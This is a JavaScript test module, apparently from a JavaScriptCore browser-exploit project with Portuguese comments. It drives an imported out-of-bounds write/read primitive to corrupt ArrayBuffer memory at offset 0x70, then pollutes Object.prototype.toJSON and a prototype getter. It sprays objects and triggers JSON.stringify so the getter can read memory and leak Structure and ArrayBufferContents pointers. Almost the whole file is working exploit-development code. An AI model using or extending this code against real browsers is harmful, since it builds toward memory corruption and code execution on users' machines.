// js/script3/testProbeOOB_AB_Self.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real, // Precisamos da referência a ele
    oob_write_absolute,
    oob_read_absolute,   // Para ler o próprio oob_array_buffer_real
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs'; // Usaremos os offsets atualizados

const GADGET_PROPERTY_NAME_ON_MYCOMPLEX = "AAAA_GetterForOOB_AB_Probe";
export let probe_oob_ab_getter_called_flag = false;
export let probe_oob_ab_results_from_getter = {};

// Objeto simples cujo getter será usado como checkpoint
class MyComplexObjectForCheckpoint {
    constructor(id) {
        this.id = `MyComplexCheckpointObj-${id}`;
        this.marker = 0xCCC00CCC;
    }
}

// toJSON que aciona o getter em MyComplexObjectForCheckpoint
export function toJSON_TriggerCheckpointGetter() {
    const FNAME_toJSON = "toJSON_TriggerCheckpointGetter";
    let returned_payload = {
        _variant_: FNAME_toJSON,
        _id_at_entry_: (this && this.id !== undefined ? String(this.id) : "N/A"),
    };
    let iteration_count = 0;
    try {
        if (typeof this === 'object' && this !== null) {
            for (const prop in this) { // Itera para acionar o getter enumerável
                iteration_count++;
                if (Object.prototype.hasOwnProperty.call(this, prop) || MyComplexObjectForCheckpoint.prototype.hasOwnProperty(prop)) {
                    returned_payload[prop] = this[prop];
                }
                if (iteration_count > 100) break;
            }
        } else { returned_payload._ERROR_ = "this is not an object or is null"; }
    } catch (e) {
        if (returned_payload) returned_payload._ERROR_IN_LOOP_ = `${e.name}: ${e.message}`;
    }
    if (returned_payload && iteration_count > 0) returned_payload._iterations_ = iteration_count;
    return returned_payload;
}


export async function executeProbeOOB_AB_SelfTest() {
    const FNAME_TEST = "executeProbeOOB_AB_SelfTest";
    logS3(`--- Iniciando Teste: Sondar oob_array_buffer_real Após Corrupção OOB ---`, "test", FNAME_TEST);
    document.title = `Probe oob_array_buffer_real Self`;

    probe_oob_ab_getter_called_flag = false;
    probe_oob_ab_results_from_getter = {
        getter_called: false,
        corruption_value_used: null,
        reads_from_oob_ab_content: {}
    };

    // Valores a serem escritos em oob_array_buffer_real[0x70]
    const CORRUPTION_VALUES_TO_TEST = [
        0xFFFFFFFF,
        0xDEADBEEF,
        0x00000000,
        // Adicionar JSC_OFFSETS.KnownStructureIDs aqui se/quando os tiver
        // ex: JSC_OFFSETS.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID
    ];

    const corruption_offset_target = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70

    // Offsets DENTRO DO CONTEÚDO de oob_array_buffer_real para ler usando oob_read_absolute.
    // Estes são especulativos - se a escrita em [0x70] corrompeu os metadados reais do
    // oob_array_buffer_real, esses metadados poderiam ser "espelhados" ou copiados
    // para o início do seu buffer de dados.
    const OFFSETS_TO_READ_IN_OOB_AB_CONTENT = {
        // Se oob_array_buffer_real[0] (como dados) se tornou o Structure* do oob_array_buffer_real
        potential_StructurePtr_from_data_0x0: 0x0,
        // Se oob_array_buffer_real[0x8] (como dados) se tornou o ArrayBufferContents* do oob_array_buffer_real
        potential_ABContentsPtr_from_data_0x8: JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET, // Deve ser 0x8
        // O que está no próprio offset 0x70 onde escrevemos?
        corruption_target_offset_0x70: corruption_offset_target,
        // Um pouco depois da corrupção
        after_corruption_offset_0x78: corruption_offset_target + 8,
        // Offset onde o ArrayBufferContents.m_dataPointer estaria se oob_array_buffer_real[0x8]
        // fosse um ArrayBufferContents* e esse ArrayBufferContents estivesse em oob_array_buffer_real[0xSOME_OTHER_OFFSET]
        // Isso é um tiro longo. O mais direto é ler 0x8 para ver se é um ponteiro para o *real* ArrayBufferContents.
    };


    for (const current_corruption_value of CORRUPTION_VALUES_TO_TEST) {
        logS3(`\n--- Sub-teste com Valor de Corrupção OOB: ${toHex(current_corruption_value)} em offset ${toHex(corruption_offset_target)} ---`, "subtest", FNAME_TEST);
        probe_oob_ab_results_from_getter.corruption_value_used = toHex(current_corruption_value);

        let originalGetterDesc = Object.getOwnPropertyDescriptor(MyComplexObjectForCheckpoint.prototype, GADGET_PROPERTY_NAME_ON_MYCOMPLEX);
        let getterPollutionApplied = false;

        try {
            Object.defineProperty(MyComplexObjectForCheckpoint.prototype, GADGET_PROPERTY_NAME_ON_MYCOMPLEX, {
                get: function() { // O Getter no MyComplexObjectForCheckpoint
                    const GETTER_FNAME = "CheckpointGetter_ProbeOOB_AB";
                    probe_oob_ab_getter_called_flag = true;
                    const current_reads = {};

                    logS3(`!!!! GETTER CHECKPOINT '${GADGET_PROPERTY_NAME_ON_MYCOMPLEX}' FOI CHAMADO !!!! (OOB Val: ${toHex(current_corruption_value)})`, "vuln", GETTER_FNAME);
                    this.marker = 0xCFCFCFCF; // Apenas para confirmar que o getter do checkpoint foi chamado

                    if (!oob_array_buffer_real) {
                        logS3(`   [${GETTER_FNAME}] oob_array_buffer_real é null! Não é possível sondar.`, "error", GETTER_FNAME);
                        probe_oob_ab_results_from_getter.reads_from_oob_ab_content = { error: "oob_array_buffer_real is null in getter" };
                        return "getter_oob_ab_null";
                    }

                    logS3(`   [${GETTER_FNAME}] Sondando o conteúdo de oob_array_buffer_real via oob_read_absolute...`, "info", GETTER_FNAME);
                    for (const key_name in OFFSETS_TO_READ_IN_OOB_AB_CONTENT) {
                        const offset_to_read = OFFSETS_TO_READ_IN_OOB_AB_CONTENT[key_name];
                        try {
                            // Ler 8 bytes (QWORD)
                            const val_qword = oob_read_absolute(offset_to_read, 8);
                            if (isAdvancedInt64Object(val_qword)) {
                                logS3(`     oob_ab_content[${toHex(offset_to_read,16)}] (${key_name}): ${val_qword.toString(true)}`, "leak", GETTER_FNAME);
                                current_reads[key_name] = val_qword.toString(true);
                            } else { // Deveria sempre ser AdvInt64 se oob_read_absolute funciona
                                logS3(`     oob_ab_content[${toHex(offset_to_read,16)}] (${key_name}): ${toHex(val_qword)} (não é AdvInt64?)`, "warn", GETTER_FNAME);
                                current_reads[key_name] = `RAW: ${toHex(val_qword)}`;
                            }
                        } catch (e_read) {
                            logS3(`     ERRO ao ler oob_ab_content[${toHex(offset_to_read,16)}] (${key_name}): ${e_read.message}`, "error", GETTER_FNAME);
                            current_reads[key_name] = `ERROR: ${e_read.message}`;
                        }
                    }
                    probe_oob_ab_results_from_getter.reads_from_oob_ab_content = current_reads;
                    probe_oob_ab_results_from_getter.getter_called_for_this_value = true;
                    return "checkpoint_getter_executed";
                },
                configurable: true, enumerable: true
            });
            getterPollutionApplied = true;
        } catch (e_getter_setup) {
            logS3(`ERRO ao definir getter checkpoint: ${e_getter_setup.message}`, "error", FNAME_TEST);
            continue;
        }

        // Spray de MyComplexObjectForCheckpoint (apenas alguns são necessários)
        const sprayed_checkpoint_objects = [];
        for (let i = 0; i < 5; i++) sprayed_checkpoint_objects.push(new MyComplexObjectForCheckpoint(i));
        await PAUSE_S3(SHORT_PAUSE_S3);

        // Configurar OOB e escrever o valor de corrupção atual
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) {
            logS3("OOB setup error para este sub-teste.", "error", FNAME_TEST);
            // Cleanup getter
            if (getterPollutionApplied && MyComplexObjectForCheckpoint.prototype.hasOwnProperty(GADGET_PROPERTY_NAME_ON_MYCOMPLEX)) {
                if (originalGetterDesc) Object.defineProperty(MyComplexObjectForCheckpoint.prototype, GADGET_PROPERTY_NAME_ON_MYCOMPLEX, originalGetterDesc);
                else delete MyComplexObjectForCheckpoint.prototype[GADGET_PROPERTY_NAME_ON_MYCOMPLEX];
            }
            continue;
        }
        try {
            oob_write_absolute(corruption_offset_target, current_corruption_value, 4); // Escrever DWORD
        } catch (e_write) {
            logS3(`OOB write error para este sub-teste: ${e_write.message}`, "error", FNAME_TEST);
            clearOOBEnvironment();
            // Cleanup getter
            if (getterPollutionApplied && MyComplexObjectForCheckpoint.prototype.hasOwnProperty(GADGET_PROPERTY_NAME_ON_MYCOMPLEX)) {
                if (originalGetterDesc) Object.defineProperty(MyComplexObjectForCheckpoint.prototype, GADGET_PROPERTY_NAME_ON_MYCOMPLEX, originalGetterDesc);
                else delete MyComplexObjectForCheckpoint.prototype[GADGET_PROPERTY_NAME_ON_MYCOMPLEX];
            }
            continue;
        }

        await PAUSE_S3(MEDIUM_PAUSE_S3);

        // Poluir Object.prototype.toJSON e tentar acionar o getter
        const ppKey_val = 'toJSON';
        let originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
        let toJSONPollutionApplied = false;
        let problem_in_current_subtest_stringify = null;

        try {
            Object.defineProperty(Object.prototype, ppKey_val, { value: toJSON_TriggerCheckpointGetter, writable: true, configurable: true, enumerable: false });
            toJSONPollutionApplied = true;

            const obj_to_probe = sprayed_checkpoint_objects[0];
            if (obj_to_probe) {
                probe_oob_ab_getter_called_flag = false; // Reset para esta sondagem
                probe_oob_ab_results_from_getter.getter_called_for_this_value = false; // Reset
                probe_oob_ab_results_from_getter.reads_from_oob_ab_content = {}; // Reset

                logS3(`   Sondando CheckpointObject 0 (ID: ${obj_to_probe.id}) para acionar getter (OOB Val: ${toHex(current_corruption_value)})`, 'info', FNAME_TEST);
                try {
                    JSON.stringify(obj_to_probe);
                } catch (e_str) {
                    problem_in_current_subtest_stringify = `${e_str.name}: ${e_str.message}`;
                    logS3(`     ERRO AO STRINGIFY obj[0] (OOB Val: ${toHex(current_corruption_value)}): ${problem_in_current_subtest_stringify}`, "critical", FNAME_TEST);
                }

                if (probe_oob_ab_getter_called_flag) {
                    logS3(`   Getter CHECKPOINT FOI CHAMADO para OOB Val: ${toHex(current_corruption_value)}. Leituras de oob_array_buffer_real:`, "vuln", FNAME_TEST);
                    logS3(JSON.stringify(probe_oob_ab_results_from_getter.reads_from_oob_ab_content, null, 2), "leak", FNAME_TEST);
                } else if (problem_in_current_subtest_stringify) {
                    logS3(`   Problema (${problem_in_current_subtest_stringify}) ocorreu para OOB Val: ${toHex(current_corruption_value)}. Getter não chamado.`, "warn", FNAME_TEST);
                } else {
                    logS3(`   Getter CHECKPOINT NÃO foi chamado para OOB Val: ${toHex(current_corruption_value)}.`, "info", FNAME_TEST);
                }
            }
        } catch (e_main_loop) {
            logS3(`Erro no loop de sondagem do getter checkpoint (OOB Val ${toHex(current_corruption_value)}): ${e_main_loop.message}`, "error", FNAME_TEST);
        } finally {
            // Cleanup toJSON
            if (toJSONPollutionApplied) {
                if (originalToJSONProtoDesc) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDesc);
                else delete Object.prototype[ppKey_val];
            }
            // Cleanup getter
            if (getterPollutionApplied && MyComplexObjectForCheckpoint.prototype.hasOwnProperty(GADGET_PROPERTY_NAME_ON_MYCOMPLEX)) {
                if (originalGetterDesc) Object.defineProperty(MyComplexObjectForCheckpoint.prototype, GADGET_PROPERTY_NAME_ON_MYCOMPLEX, originalGetterDesc);
                else delete MyComplexObjectForCheckpoint.prototype[GADGET_PROPERTY_NAME_ON_MYCOMPLEX];
            }
            clearOOBEnvironment();
            sprayed_checkpoint_objects.length = 0;
            globalThis.gc?.();
            await PAUSE_S3(MEDIUM_PAUSE_S3);
        }
    } // Fim do loop CORRUPTION_VALUES_TO_TEST

    logS3(`--- Teste de Sondagem de oob_array_buffer_real CONCLUÍDO ---`, "test", FNAME_TEST);
    document.title = `Probe oob_ab_real Done`;
}
